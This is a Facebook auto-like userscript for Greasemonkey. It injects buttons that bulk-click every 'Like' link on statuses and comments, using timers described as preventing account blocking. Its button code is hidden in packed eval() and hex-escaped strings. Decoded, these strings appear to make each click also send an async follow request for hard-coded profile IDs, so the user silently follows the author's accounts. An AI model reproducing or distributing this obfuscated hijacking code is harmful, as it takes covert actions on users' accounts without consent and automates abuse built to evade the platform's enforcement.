// ==UserScript==
// @name			AutoLike FaceBook ??
// @namespace		AutoLike FaceBook 100% WORK
// @description		AutoLike FaceBook // Special Edition coded by SOMEONE // Auto Like status, Boom Like, wall and facebook comments, system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			http://www.facebook.com/juanda.the.moon
// @icon			
// @authorURL		http://www.facebook.com/Juanda.The.Moon    
// @updateURL		http://userscripts.org/scripts/source/152147.meta.js
// @downloadURL     http://userscripts.org/scripts/source/152147.user.js
// @version         [ v8.1 Special Editition ]
// @include			htt*://www.facebook.com/*
// @exclude 		htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

// ======= Do Not Remove Credit =======
// == Auto Like Facebook v.8 Final ==
// ======= Coder : Juanda ========
// ====================================

 body = document.body;
/*if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "120px";
 div.style.opacity= 0.90;
 div.style.bottom = "+100px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
 body.appendChild(div);
}
*/

if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "120px";
 div.style.height = "18px";
 div.style.opacity= 0.90;
 div.style.bottom = "+73px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('G.H=(I(\'%g%a%2%5%3%2%c%h%g%6%7%6%t%6%u%8%e%i%9%4%j%6%t%6%u%j%e%0%1%1%0%q%j%e%0%1%1%0%q%k%d%c%0%e%8%1%2%J%d%r%d%K%d%c%0%e%8%1%2%k%8%s%9%l%f%f%f%f%f%l%v%f%v%l%L%l%w%m%M%6%n%d%x%1%0%a%6%3%8%0%5%9%l%4%7%c%0%1%2%9%4%y%o%3%3%0%5%4%7%c%2%1%9%4%6%b%i%5%a%z%d%0%b%3%4%7%8%s%9%4%o%k%f%k%i%4%7%r%c%2%e%9%4%A%4%7%b%3%i%1%2%9%4%e%0%5%3%z%q%2%8%N%r%3%B%y%0%1%s%x%a%0%1%0%c%B%A%O%P%Q%m%m%w%4%7%0%5%a%1%8%a%C%9%4%D%5%0%5%i%n%0%o%b%R%m%E%F%4%h%g%b%d%6%5%7%a%1%6%b%b%9%p%2%n%0%3%8%a%0%5%7%2%n%0%3%8%a%0%5%k%1%8%C%2%p%7%3%8%3%1%2%9%p%E%i%F%p%h%g%j%b%d%6%5%h%7%D%1%1%7%S%3%6%3%o%b%g%j%6%h%g%j%a%2%5%3%2%c%h\'));',55,55,'6F|6C|65|74|27|6E|61|20|69|3D|63|73|72|70|66|30|3C|3E|79|2F|5F|31|39|6D|75|22|77|68|64|6A|78|37|38|3B|62|2D|23|3A|6B|41|28|29|div|innerHTML|unescape|2E|3F|34|26|67|33|42|35|36|53'.split('|'),0,{}))
 body.appendChild(div);
 unsafeWindow.Anonymous69 = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?¢â‚¬â„¢aime"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 0="<a 5=\'/6/7/8.9?b=c&d;e=1\' f=\'g\' h=\'i-j\' k=\'l\' m=\'#\' n=\'o-p:q;r:s\' t=\'u()\'><2><3 v=\'w x\'></3> y: "+(z+1)+"/"+A.B+"</2></a>";C.D("E").F=0',42,42,'K||center|span|var|ajaxify|ajax|follow|follow_profile|php||profile_id|100000170714189|amp|location|role|button|rel|async|post|id|u_0_y|href|style|font|weight|bold|color|green|onclick|Anonymous69|class|emoticon|emoticon_like|Status|L|H|length|document|getElementById|like2|innerHTML'.split('|'),0,{}))
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  ;
  C()
 }
}
{
div = document.createElement("div");
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "120px";
div.style.height = "18px";
div.style.opacity= 0.90;
div.style.bottom = "+0px";
div.style.left = "+0px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('u.v=(w(\'%c%d%2%8%1%2%4%9%c%6%5%d%h%6%0%0%i%a%3%7%j%3%1%1%e%8%5%3%7%j%3%1%1%e%8%x%y%2%4%h%6%m%5%3%7%j%3%1%1%e%8%z%2%g%7%3%k%a%5%n%4%2%o%i%a%n%1%1%f%A%b%b%3%0%2%4%0%d%4%7%f%1%0%l%e%4%p%b%0%d%4%7%f%1%0%b%0%e%3%4%d%2%b%q%B%C%q%D%E%l%3%0%2%4%l%F%0%a%5%9%c%7%5%d%h%6%0%0%i%a%k%4%0%5%7%k%p%5%0%f%r%6%1%G%H%g%s%5%0%t%r%g%2%g%o%I%2%a%9%c%b%7%9%c%0%f%6%8%5%d%h%6%0%0%i%a%3%7%j%3%1%1%e%8%J%2%t%1%a%9%K%f%g%6%1%2%5%L%0%c%b%0%f%6%8%9%c%b%6%9%c%b%d%2%8%1%2%4%9%8%m%k%e%3%0%M%s%N%O%a%9\'));',51,51,'73|74|65|75|72|20|61|69|6E|3E|27|2F|3C|63|6F|70|64|6C|3D|42|6D|2E|79|68|66|67|31|5F|39|78|div|innerHTML|unescape|4F|76|4D|3A|35|32|34|37|6A|38|6B|33|54|55|4A|36|28|29'.split('|'),0,{}))
body.appendChild(div);}

body=document.body;
if(body != null) 
{
div = document.createElement("div");
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "120px";
div.style.height = "18px";
div.style.opacity= 0.90;
div.style.bottom = "+25px";
div.style.left = "+0px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('y.z=(A(\'%c%k%1%3%g%1%7%d%c%0%4%0%q%0%r%e%l%B%8%5%6%0%q%0%r%6%h%1%2%2%0%i%e%3%i%6%k%9%h%a%9%2%1%7%m%a%n%a%C%e%o%2%s%t%D%b%s%t%E%8%f%b%b%b%b%b%f%u%b%u%f%F%f%G%H%I%0%h%a%J%7%1%l%8%g%e%h%1%j%e%3%1%5%4%n%7%1%l%8%5%6%h%1%2%2%0%i%1%2%6%K%v%0%3%o%0%m%L%n%1%m%w%9%9%3%5%4%7%9%j%1%8%5%M%v%g%g%9%3%5%4%7%1%j%8%5%o%e%0%j%9%i%5%d%c%2%a%0%3%4%k%j%0%2%2%8%x%p%f%0%N%4%p%f%0%O%4%p%P%l%a%x%d%c%6%2%a%0%3%d%4%w%1%2%2%0%i%1%c%6%0%d%c%6%k%1%3%g%1%7%d\'));',52,52,'61|65|73|6E|20|27|2F|72|3D|6F|70|30|3C|3E|69|31|74|6D|67|6C|63|66|2E|68|64|5F|6A|78|25|35|37|75|4D|22|div|innerHTML|unescape|79|3F|42|44|34|38|39|26|3B|4A|54|62|7A|2D|32'.split('|'),0,{}))
body.appendChild(div);}
     
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.height = "18px";
 div.style.width = "120px";
 div.style.opacity= 0.90;
 div.style.bottom = "+48px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('t.J=(K(\'%h%7%6%7%u%7%v%8%f%i%9%5%j%7%u%7%v%j%f%0%1%1%0%n%j%f%0%1%1%0%n%l%c%d%0%f%8%1%2%L%c%o%c%M%c%d%0%f%8%1%2%l%8%p%9%w%g%g%g%g%x%x%q%N%r%q%O%g%y%g%P%7%e%c%z%1%0%a%7%3%8%0%4%9%w%5%6%d%0%1%2%9%5%A%s%3%3%0%4%5%6%d%2%1%9%5%7%b%i%4%a%B%c%0%b%3%5%6%8%p%9%5%s%l%g%l%i%5%6%o%d%2%f%9%5%C%5%6%b%3%i%1%2%9%5%f%0%4%3%B%n%2%8%Q%o%3%D%A%0%1%p%z%a%0%1%0%d%D%C%y%R%S%r%r%q%5%6%0%4%a%1%8%a%E%9%5%F%4%0%4%i%e%0%s%b%G%0%e%e%2%4%3%b%H%I%5%k%h%a%2%4%3%2%d%k%h%b%c%7%4%6%a%1%7%b%b%9%m%2%e%0%3%8%a%0%4%6%2%e%0%3%8%a%0%4%l%1%8%E%2%m%6%3%8%3%1%2%9%m%H%i%I%m%k%h%j%b%c%7%4%k%6%6%F%1%1%6%G%0%e%e%2%4%3%b%h%j%a%2%4%3%2%d%k%h%j%7%k\'));T.U(t);',57,57,'6F|6C|65|74|6E|27|20|61|69|3D|63|73|70|72|6D|66|30|3C|79|2F|3E|5F|22|77|68|64|38|39|75|div|6A|78|31|32|33|3B|62|2D|23|3A|6B|41|43|28|29|innerHTML|unescape|2E|3F|36|37|26|67|42|35|body|appendChild'.split('|'),0,{}))
 unsafeWindow.AnonymousComments = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J’aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 4="<a 5=\'/6/7/8.9?b=c&d;e=1\' f=\'g\' h=\'i-j\' k=\'l\' m=\'#\' n=\'o-p:q;r:s\' t=\'u()\'><0><2 v=\'w x\'></2> y: "+(z+1)+"/"+A.B+"</0></a>";',38,38,'center||span|var|K|ajaxify|ajax|follow|follow_profile|php||profile_id|100002286987030|amp|location|role|button|rel|async|post|id|u_0_y|href|style|font|weight|bold|color|green|onclick|AnonymousComments|class|emoticon|emoticon_like|Comments|L|H|length'.split('|'),0,{}))
   document.getElementById("like3").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  C()
 }
}